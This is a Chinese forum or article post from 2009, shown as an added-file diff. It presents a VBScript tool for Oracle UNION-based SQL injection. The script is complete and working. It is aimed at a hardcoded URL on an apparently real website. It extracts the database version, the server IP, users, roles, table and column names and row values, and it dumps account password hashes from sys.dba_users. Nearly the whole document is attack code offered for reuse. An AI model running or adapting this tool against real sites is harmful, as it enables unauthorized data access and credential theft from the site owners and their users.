@@ -1,0 +1,272 @@
+oracle union 注入工具(vbs版)
+文章录入：王子    责任编辑：dingkai1983  更新时间：2009-12-29 11:12:09 5
+【字体：小 大】
+
+     由于书稿中要用到这个工具，所以花了半天时间写的，功能还不全面。只能支持union的注入点。
+
+转载请注明出处：
+
+Made by 孤水绕城
+
+QQ:540410588
+
+BLOG:http://hi.baidu.com/540410588
+
+'***********************************************************************************************
+'oracle union 注入工具 By 孤水绕城
+'适用于可以使用union的注入点上
+'***********************************************************************************************
+'改了Tr4c3的ql2005注射辅助脚本[粗糙版]的框架
+
+
+Const method = "Get" '提交方式请修改此处,有get和post可选
+Const DisPlay = "D" 'S 保存到文件，D输出到屏幕
+
+Dim strUrl_B, strUrl, MyArray, strArg, strD,tmpStrArg,currcount,num
+'自己手工判断字段数，然后找出一个字符格式并且可以在网页中显示的位置替换为<**>
+strUrl_B = "http://www.sdtheatre.cn/renews.jsp?id=348%20and%201=2%20union%20all%20select%20null,<**>,null,null,null,null,null,null,null,null,null,null" '基于注射点的不确定性，此处请手工更改
+currcount = -1
+MyArray = Split(strUrl_B, "?", -1, 1)
+strUrl = MyArray(0) '取url
+strArg = MyArray(1) '取参数
+Set Args = Wscript.Arguments
+If Args.Count = 0 Then
+showU()
+End If
+'************************************************************************
+' 信息探测 
+'************************************************************************
+If Args.Count =1 Then
+If LCase(Trim(Args(0)))= "info" then
+ResuT("The oracle version")
+ResuT("---------------===============================--------------")
+tmpStrArg = Replace(strArg,"<**>",plastr("banner"))
+Call sqlInj("%20from%20v$version%20where%201=1%20--","content")
+ResuT("The oracle ip")
+ResuT("---------------===============================--------------")
+tmpStrArg = Replace(strArg,"<**>",plastr("sys_context(chr(117)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(114)%7C%7Cchr(101)%7C%7Cchr(110)%7C%7Cchr(118),chr(105)%7C%7Cchr(112)%7C%7Cchr(95)%7C%7Cchr(97)%7C%7Cchr(100)%7C%7Cchr(100)%7C%7Cchr(114)%7C%7Cchr(101)%7C%7Cchr(115)%7C%7Cchr(115))"))
+Call sqlInj("%20%20from%20dual%20where%201=1%20-- ","content")
+ResuT("The database")
+ResuT("---------------===============================--------------")
+tmpStrArg = Replace(strArg,"<**>",plastr("name"))
+Call sqlInj("%20from%20v$database%20where%20rownum=1%20-- ","content")
+ResuT("The database user")
+ResuT("---------------===============================--------------")
+tmpStrArg = Replace(strArg,"<**>",plastr("user"))
+Call sqlInj("%20%20from%20user_tables%20where%20rownum=1%20--","content")
+
+ResuT("The database All users")
+ResuT("---------------===============================--------------")
+tmpStrArg = Replace(strArg,"<**>",plastr("count(*)"))
+Call sqlInj("%20from%20all_users%20where%201=1%20--","count")
+tmpStrArg = Replace(strArg,"<**>",plastr("username"))
+For num=0 To currcount
+Call sqlInj("%20from%20(select%20rownum%20r,username%20from%20(select%20rownum%20r,username%20from%20all_users%20where%20rownum%3C="&num+1&"%20order%20by%201%20desc)%20t%20where%20r%3E"&num&"%20order%20by%201)t%20where%201=1%20--","content")
+Next 
+currcount = -1
+
+ResuT("The user PRIVILEGES")
+ResuT("---------------===============================--------------")
+tmpStrArg = Replace(strArg,"<**>",plastr("count(*)"))
+Call sqlInj("%20from%20user_role_privs%20where%201=1%20--","count")
+tmpStrArg = Replace(strArg,"<**>",plastr("granted_role"))
+For num=0 To currcount
+Call sqlInj("%20from%20(select%20rownum%20r,granted_role%20from%20(select%20rownum%20r,granted_role%20from%20user_role_privs%20where%20rownum%3C="&num+1&"%20order%20by%201%20desc)%20t%20where%20r%3E"&num&"%20order%20by%201)t%20where%201=1%20--","content")
+Next
+currcount = -1
+
+ResuT("The SESSION_ROLES")
+ResuT("---------------===============================--------------")
+tmpStrArg = Replace(strArg,"<**>",plastr("count(*)"))
+Call sqlInj("%20from%20session_roles%20where%201=1%20-- ","count")
+tmpStrArg = Replace(strArg,"<**>",plastr("role"))
+For num=0 To currcount
+Call sqlInj("%20%20from%20(select%20rownum%20r,role%20from%20(select%20rownum%20r,role%20from%20session_roles%20where%20rownum%3C="&num+1&"%20order%20by%201%20desc)%20t%20where%20r%3E"&num&"%20order%20by%201)t%20where%201=1%20-- ","content")
+Next
+currcount = -1
+ResuT("The service_names")
+ResuT("---------------===============================--------------")
+tmpStrArg = Replace(strArg,"<**>",plastr("value"))
+Call sqlInj("%20from%20v$parameter%20where%20name=chr(115)%7C%7Cchr(101)%7C%7Cchr(114)%7C%7Cchr(118)%7C%7Cchr(105)%7C%7Cchr(99)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(110)%7C%7Cchr(97)%7C%7Cchr(109)%7C%7Cchr(101)%7C%7Cchr(115)%20--","content")
+
+
+ResuT("The Account Hash ")
+ResuT("---------------===============================--------------")
+tmpStrArg = Replace(strArg,"<**>",plastr("count(*)"))
+Call sqlInj("%20from%20sys.dba_users%20where%201=1%20--","count")
+tmpStrArg = Replace(strArg,"<**>",plastr("a"))
+For num=0 To currcount
+Call sqlInj("%20from%20(select%20rownum%20r,a%20from%20(select%20rownum%20r,username%7C%7Cchr(58)%7C%7Cpassword%7C%7Cchr(58)%7C%7Cname%7C%7Cchr(58)%7C%7Cutl_inaddr.get_host_name%7C%7Cchr(58)%20as%20a%20from%20sys.dba_users,sys.v_$database%20where%20rownum%3C="&num+1&"%20order%20by%201%20desc)%20t%20where%20r%3E"&num&"%20order%20by%201)t%20where%201=1%20--","content")
+Next
+currcount = -1
+Wscript.Quit
+End If
+End If
+'************************************************************************
+' 爆表 
+'************************************************************************
+If Args.Count=2 And LCase(Trim(Args(1)))="tables" Then
+ResuT("All The tables ")
+ResuT("---------------===============================--------------")
+tmpStrArg = Replace(strArg,"<**>",plastr("count(*)"))
+Call sqlInj("%20from%20user_tables%20where%201=1%20--","count")
+tmpStrArg = Replace(strArg,"<**>",plastr("table_name"))
+If currcount >0 Then 
+For num=0 To currcount
+Call sqlInj("%20from%20(select%20rownum%20r,table_name%20from%20(select%20rownum%20r,table_name%20from%20user_tables%20where%20rownum%3C="&num+1&"%20order%20by%201%20desc)%20t%20where%20r%3E"&num&"%20order%20by%201)t%20where%201=1%20--","content")
+Next
+currcount = -1
+End If 
+Wscript.Quit
+End If
+
+'************************************************************************
+' 爆字段 
+'************************************************************************
+If Args.Count=3 And LCase(Trim(Args(2)))="cols" Then
+ResuT(" The cols of "&Args(1))
+ResuT("---------------===============================--------------")
+tmpStrArg = Replace(strArg,"<**>",plastr("count(*)"))
+Call sqlInj("%20from%20user_tab_columns%20where%20table_name="&encodechr(UCase(Trim(Args(1))))&"%20--","count")
+tmpStrArg = Replace(strArg,"<**>",plastr("column_name"))
+If currcount >0 Then 
+For num=0 To currcount
+Call sqlInj("%20from%20(select%20rownum%20r,column_name%20from%20(select%20rownum%20r,column_name%20from%20user_tab_columns%20where%20rownum%3C="&num+1&"%20and%20table_name="&encodechr(UCase(Trim(Args(1))))&"%20order%20by%201%20desc)%20t%20where%20r%3E"&num&"%20order%20by%201)t%20where%201=1%20--","content")
+Next
+currcount = -1
+End If 
+Wscript.Quit
+End If
+
+'************************************************************************
+' 爆字段值 
+'************************************************************************
+If Args.Count=4 And LCase(Trim(Args(3)))="values" Then
+ResuT(" The value of "&Args(2))
+ResuT("---------------===============================--------------")
+tmpStrArg = Replace(strArg,"<**>","count(*)")
+Call sqlInj("%20from%20client%20where%201=1%20--","count")
+tmpStrArg = Replace(strArg,"<**>",UCase(Trim(Args(2))))
+For num=0 To currcount 
+Call sqlInj("%20from%20(select%20rownum%20r,"&UCase(Trim(Args(2)))&"%20from%20(select%20rownum%20r,"&UCase(Trim(Args(2)))&"%20from%20"&UCase(Trim(Args(1)))&"%20where%20rownum%3C="&num+1&"%20and%201=1%20order%20by%201%20desc)%20t%20where%20r%3E"&num&"%20order%20by%201)t%20where%201=1%20-- ","content")
+next
+Wscript.Quit
+End If
+Sub SqlInj(value,thetype)
+If UCase(method) = "GET" Then
+value = tmpStrArg & value
+Dim thestr
+thestr = strUrl &"?" & value
+'wsh.echo thestr
+Set objXML = CreateObject("Microsoft.XMLHTTP")
+objXML.Open "GET", strUrl &"?" & value , False
+objXML.SetRequestHeader "Referer", strUrl
+'objXML.SetRequestHeader "Accept-Language", "EUC-KR"
+objXML.send()
+strRevS = objXML.ResponseText '默认用这个
+'strRevS = bytes2BSTR(objXML.ResponseBody) '韩文有时候要用这个
+If InStr(strRevS,"^")<>0 And InStr(strRevs,"~")<>0 Then
+If thetype = "count" Then 
+strD = Mid(strRevS,InStr(strRevS,"^^^")+3, InStr(strRevs,"~~~") - Instr(strRevS,"^^^")-3)
+currcount = CInt(strD) 
+ResuT(" |_the count number ["&strD&"]")
+End if
+If thetype = "content" And currcount <> -1 Then
+strD = Mid(strRevS,InStr(strRevS,"^^^")+3, InStr(strRevs,"~~~") - Instr(strRevS,"^^^")-3)
+ResuT(" |_|_"&strD)
+End If
+If thetype = "content" And currcount = -1 then
+strD = Mid(strRevS,InStr(strRevS,"^^^")+3, InStr(strRevs,"~~~") - Instr(strRevS,"^^^")-3)
+ResuT(" |_"&strD)
+End If
+Else
+strD = ""
+End If
+ElseIf UCase(method) = "POST" Then
+value = tmpStrArg & value
+Set objXML = CreateObject("Microsoft.XMLHTTP")
+objXML.Open "POST", strUrl, False
+objXML.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+objXML.SetRequestHeader "Referer", strUrl
+objXML.send(UrlEncode(value))
+strRevS = objXML.ResponseText '默认用这个
+'strRevS = bytes2BSTR(objXML.ResponseBody) '韩文有时候要用这个
+If InStr(strRevS,"^")<>0 And InStr(strRevs,"~")<>0 Then
+If thetype = "count" Then 
+strD = Mid(strRevS,InStr(strRevS,"^^^")+3, InStr(strRevs,"~~~") - Instr(strRevS,"^^^")-3)
+currcount = CInt(strD) 
+ResuT(" |_the count number"&strD)
+End if
+If thetype = "content" And currcount <> -1 then
+strD = Mid(strRevS,InStr(strRevS,"^^^")+3, InStr(strRevs,"~~~") - Instr(strRevS,"^^^")-3)
+ResuT(" |_|_"&strD)
+End If
+If thetype = "content" And currcount = -1 then
+strD = Mid(strRevS,InStr(strRevS,"^^^")+3, InStr(strRevs,"~~~") - Instr(strRevS,"^^^")-3)
+ResuT(" |_"&strD)
+End If
+Else
+strD = ""
+End If
+End If
+End Sub
+
+Function ResuT(strInfo)
+If UCase(DisPlay) = "S" Then
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set fso1 = fso.OpenTextFile("result.txt",8,True)
+fso1.WriteLine(strInfo)
+fso1.Close
+Set fso = Nothing
+ElseIf UCase(DisPlay) = "D" Then
+Wscript.Echo(strInfo)
+End If
+End Function
+
+Function UrlEncode(str)
+str = Replace(str," ","+")
+UrlEncode = str
+End Function
+
+Function bytes2BSTR(vIn)
+strReturn = ""
+For i = 1 To LenB(vIn)
+ThisCharCode = AscB(MidB(vIn,i,1))
+If ThisCharCode < &H80 Then
+strReturn = strReturn & Chr(ThisCharCode)
+Else
+NextCharCode = AscB(MidB(vIn,i+1,1))
+strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))
+i = i + 1
+End If
+Next
+bytes2BSTR = strReturn
+End Function
+
+Function encodechr(str)
+Dim i,retstr
+retstr = ""
+For i=1 To Len(str)
+retstr = retstr&"chr("&Asc(Mid(str,i,1))&")%7C%7C"
+Next
+encodechr = Left(retstr,Len(retstr)-6)
+End Function
+
+Function plastr(str)
+Dim retstr
+retstr = retstr&"chr(94)%7C%7Cchr(94)%7C%7Cchr(94)%7C%7C"&str&"%7C%7Cchr(126)%7C%7Cchr(126)%7C%7Cchr(126)"
+plastr = retstr
+End function
+Sub showU()
+With Wscript
+.Echo("+--------------------------=====================------------------------------+")
+.Echo("oracle union 注入工具 By 孤水绕城")
+.Echo("Usage:")
+.Echo(" cscript "&.ScriptName&" info--爆基本信息")
+.Echo(" cscript "&.ScriptName&" pubs tables--爆库pubs里所有用户表名")
+.Echo(" cscript "&.ScriptName&" pubs authors cols--爆库pubs里authors表的所有字段名")
+.Echo(" cscript "&.ScriptName&" pubs authors au_id values--爆pubs.dbo.authors里au_id的值")
+.Echo("+--------------------------=====================------------------------------+")
+.Quit
+End with
+End Sub
